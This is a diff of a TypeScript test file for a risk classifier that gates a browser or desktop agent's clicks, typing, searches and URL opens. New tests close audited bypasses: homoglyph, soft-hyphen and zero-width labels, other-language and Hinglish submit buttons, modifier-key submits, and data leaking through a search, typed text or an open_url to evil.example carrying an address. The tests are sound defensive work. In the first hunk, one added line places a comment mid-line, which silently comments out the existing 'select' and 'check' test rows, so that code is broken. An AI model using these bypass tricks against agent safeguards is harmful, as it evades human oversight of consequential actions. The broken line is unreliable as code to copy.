@@ -10,7 +10,7 @@ test("table: low / medium / high", () => {
   const rows: Array<[any, string]> = [
     [{ type: "scroll", direction: "down" }, "low"], [{ type: "wait", ms: 500 }, "low"], [{ type: "screenshot", to: "clipboard" }, "low"],
     [{ type: "done", say: "x" }, "low"], [{ type: "ask", say: "x" }, "low"], [{ type: "fail", say: "x" }, "low"],
-    [{ type: "type", id: "b6", text: "0xabc" }, "medium"], [{ type: "select", id: "b8", option: "0.8.26" }, "medium"], [{ type: "check", id: "b10", checked: true }, "medium"],
+    [{ type: "type", id: "b6", text: "0xabc" }, "high"],   // a value the person never gave (audit 4, 1.11) [{ type: "select", id: "b8", option: "0.8.26" }, "medium"], [{ type: "check", id: "b10", checked: true }, "medium"],
     [{ type: "click", id: "b0" }, "medium"], [{ type: "click", id: "b18" }, "medium"], // Home, Reset
     [{ type: "click", id: "b17" }, "high"],                                            // Verify and Publish
     [{ type: "open_app", name: "Notes" }, "medium"], [{ type: "quit_app", name: "Notes" }, "high"], [{ type: "copy", text: "hello" }, "medium"],
@@ -21,9 +21,11 @@ test("table: low / medium / high", () => {
 
 test("HIGH labels, English and icon names; near-misses stay medium", () => {
   const high = ["Submit", "Send message", "Post", "Publish", "Pay now", "Buy", "Purchase", "Place order", "Confirm", "Delete account", "Remove", "Sign out", "Log out", "Logout", "Transfer funds", "Approve", "Allow", "Connect wallet", "Install", "Authorize", "Authorise app", "Checkout", "Withdraw", "Trash", "Paper plane", "Swap", "SEND"];
-  const medium = ["Postal code", "Sender name", "Payment history", "Orders", "Home", "Next", "Search", "Sign in", "Log in", "Reset", "Cancel", "Open", "Download", "Reorder"];
+  const medium = ["Postal code", "Sender name", "Payment history", "Orders", "Home", "Next", "Search", "Sign in", "Log in", "Reset", "Cancel", "Open", "Download"];
   for (const l of high) assert.equal(risk({ type: "click", id: "b1" }, page([["b1", "button", l]])), "high", l);
-  for (const l of medium) assert.equal(risk({ type: "click", id: "b1" }, page([["b1", "button", l]])), "medium", l);
+  // near-misses never match a commit word (as links; a BUTTON with an unknown label now asks anyway, audit 4 1.3)
+  for (const l of medium) assert.equal(risk({ type: "click", id: "b1" }, page([["b1", "link", l]])), "medium", l);
+  for (const l of ["Home", "Next", "Search", "Sign in", "Log in", "Reset", "Cancel", "Open", "Download", "Orders"]) assert.equal(risk({ type: "click", id: "b1" }, page([["b1", "button", l]])), "medium", l + " (button)");
   assert.equal(risk({ type: "click", id: "b1" }, page([["b1", "submit", "Go"]])), "high"); // role says it
 });
 
@@ -85,7 +87,9 @@ test("secret-looking VALUES are refused unless the task gave them", () => {
   assert.equal(risk({ type: "type", id: "b1", text: "sk-abcdefghijklmnop1234" }, c, "paste sk-abcdefghijklmnop1234 in the notes"), "medium");
   // a public contract address (40 hex) is not a secret
   assert.equal(secretShaped("0x1234567890123456789012345678901234567890"), false);
-  assert.equal(risk({ type: "type", id: "b1", text: "0x1234567890123456789012345678901234567890" }, c, "enter the contract address"), "medium");
+  assert.equal(risk({ type: "type", id: "b1", text: "0x1234567890123456789012345678901234567890" }, c, "enter 0x1234567890123456789012345678901234567890 as the contract address"), "medium");
+  // ...but a value the person never gave asks first: a page reads every keystroke (audit 4, 1.11)
+  assert.equal(risk({ type: "type", id: "b1", text: "0x1234567890123456789012345678901234567890" }, c, "enter the contract address"), "high");
 });
 
 test("open_url: named sites are low, page-only addresses are high", () => {
@@ -159,7 +163,9 @@ test("structural rule: an unknown button on a page with editable fields is HIGH 
   for (const safe of ["Cancel", "Close", "Back", "Reset", "Clear", "Show password", "Hide", "Expand", "Menu", "Search", "Play", "Pause", "Mute", "Next step", "Return to Main"]) assert.equal(risk({ type: "click", id: "b2" }, form(safe), "fill my name"), "medium", safe);
   // links to other pages are not buttons; and a page with nothing to type into has nothing to submit
   assert.equal(risk({ type: "click", id: "b2" }, page([["b1", "input", "Name"], ["b2", "link", "Go to page 2"]]), "fill my name"), "medium");
-  assert.equal(risk({ type: "click", id: "b2" }, page([["b2", "button", "Go"]]), "press it"), "medium");
+  // a button we cannot place asks on ANY page, form or not (audit 4, 1.3); naming it lowers it
+  assert.equal(risk({ type: "click", id: "b2" }, page([["b2", "button", "Go"]]), "press it"), "high");
+  assert.equal(risk({ type: "click", id: "b2" }, page([["b2", "button", "Go"]]), "press Go"), "medium");
 });
 test("'don't submit': any submit-like click is REFUSED with 'You said not to submit'", () => {
   const f = page([["b1", "input", "Name"], ["b2", "button", "Create account"], ["b3", "button", "Delete account"], ["b4", "button", "Go"], ["b5", "button", "Cancel"]]);
@@ -175,4 +181,54 @@ test("'don't submit': any submit-like click is REFUSED with 'You said not to sub
   const e = page([["b1", "input", "Name"], ["b2", "button", "Submit"]], [], { focused: "b1" });
   assert.equal(classify({ type: "key", combo: "enter" }, e, "type my name, don't submit").risk, "refused");
   assert.equal(classify({ type: "key", combo: "enter" }, e, "type my name").risk, "high");
+});
+
+// ---- audit 4 (docs/audit/AUDIT-4-2026-11-06.md): every bypass found there stays closed ----
+test("audit 4 1.1: an unlabelled button is never 'named by the task'", () => {
+  assert.equal(taskNames("fill my email", ""), false);
+  assert.equal(taskNames("fill my email", "   "), false);
+  assert.equal(risk({ type: "click", id: "b2" }, page([["b1", "input", "Email"], ["b2", "button", ""]]), "fill my email"), "high");
+  assert.equal(risk({ type: "click", id: "b2" }, page([["b2", "button", ""]]), "do it"), "high");
+});
+test("audit 4 1.2: a harmless first word does not make a destructive label safe", () => {
+  for (const l of ["Cancel subscription", "Close account", "Clear all data", "Reset all settings", "Cancel my plan", "Clear history", "Delete chat"]) {
+    for (const ctl of [page([["b1", "button", l]]), page([["b0", "input", "Name"], ["b1", "button", l]])]) assert.equal(risk({ type: "click", id: "b1" }, ctl, "tidy up"), "high", l);
+  }
+  for (const l of ["Cancel", "Close dialog", "Show more", "Show password", "Next step", "Back", "Clear filters"]) assert.equal(risk({ type: "click", id: "b1" }, page([["b0", "input", "Name"], ["b1", "button", l]]), "fill my name"), "medium", l);
+});
+test("audit 4 1.3: other languages, Hinglish, homoglyphs, soft hyphens and spaced letters", () => {
+  const labels = ["भेजें", "जमा करें", "भुगतान करें", "खरीदें", "हटाएं", "bhej dijiye", "jama kijiye", "paise bhejo", "Kaufen", "Envoyer", "Enviar", "Comprar", "支付", "Proceed", "Continue", "OK", "Yes", "Accept", "I agree", "Sign", "Reply", "Comment", "Repost", "Merge pull request", "Vote", "Claim", "Stake", "Bridge", "Bid", "Archive", "Leave group", "Unfollow", "Block", "Execute", "Run", "Dеlete", "S u b m i t", "Sub­mit", "Pa​y", "➤"];
+  for (const l of labels) assert.equal(risk({ type: "click", id: "b1" }, page([["b1", "button", l]]), "do the thing"), "high", l);
+  assert.equal(risk({ type: "click", id: "b1" }, page([["b1", "button", "Sign in"]]), "do the thing"), "medium");
+});
+test("audit 4 1.4: modifiers and Enter cannot go round a HIGH click", () => {
+  const pay = page([["b1", "button", "Pay"]], [], { focused: "b1" });
+  for (const k of ["enter", "shift+enter", "space", "shift+space", "alt+enter"]) assert.equal(risk({ type: "key", combo: k }, pay, "x"), "high", k);
+  const area = page([["b1", "textarea", "Reply"], ["b2", "link", "Help"]], [], { focused: "b1" });
+  for (const k of ["ctrl+enter", "cmd+enter", "alt+enter", "command+return"]) assert.equal(risk({ type: "key", combo: k }, area, "write a reply"), "high", k);
+  assert.equal(risk({ type: "key", combo: "shift+enter" }, area, "write a reply"), "medium");
+  // Enter in a field submits the form even when the only button is "Next"
+  const next = page([["b1", "input", "Email"], ["b2", "button", "Proceed"]], [], { focused: "b1" });
+  assert.equal(risk({ type: "key", combo: "enter" }, next, "fill my email"), "high");
+});
+test("audit 4 1.5: classify sees the person's words only (the loop passes task + answers)", () => {
+  const f = page([["b1", "input", "Email"], ["b2", "button", "Proceed"]]);
+  assert.equal(risk({ type: "click", id: "b2" }, f, "fill my email"), "high");
+});
+test("audit 4 1.11: data cannot leave through search, a link or typing without a tap", () => {
+  const c = page([["b1", "input", "Notes"]]);
+  assert.equal(risk({ type: "search", query: "order 4411 card ending 4242 address 12 MG road" }, c, "book a ticket"), "high");
+  assert.equal(risk({ type: "search", query: "weather Mumbai" }, c, "what is the weather in Mumbai"), "low");
+  assert.equal(risk({ type: "open_url", url: "https://evil.example/?d=order+4411+address+12+MG+road" }, c, "book a ticket"), "high");
+  assert.equal(risk({ type: "open_url", url: "https://www.youtube.com/results?search_query=lofi+beats" }, c, "play lofi beats on youtube"), "low");
+  assert.equal(risk({ type: "type", id: "b1", text: "12 MG Road Mumbai" }, c, "book a ticket"), "high");
+  assert.equal(risk({ type: "type", id: "b1", text: "12 MG Road Mumbai" }, c, "book a ticket, my address is 12 MG Road, Mumbai"), "medium");
+});
+test("audit 4: closing a tab that looks like a wallet asks", () => {
+  assert.equal(risk({ type: "tab", op: "close", match: "MetaMask" }, page([]), "close that"), "high");
+  assert.equal(risk({ type: "tab", op: "close", match: "YouTube" }, page([]), "close youtube"), "medium");
+});
+test("audit 4: media buttons that name what they play stay medium; a commit word inside them does not", () => {
+  for (const l of ["Play: Night Train", "Watch the trailer", "Pause", "Next video", "Load more"]) assert.equal(risk({ type: "click", id: "b1" }, page([["b1", "button", l]]), "play something"), "medium", l);
+  assert.equal(risk({ type: "click", id: "b1" }, page([["b1", "button", "Play and pay ₹99"]]), "play it"), "high");
 });
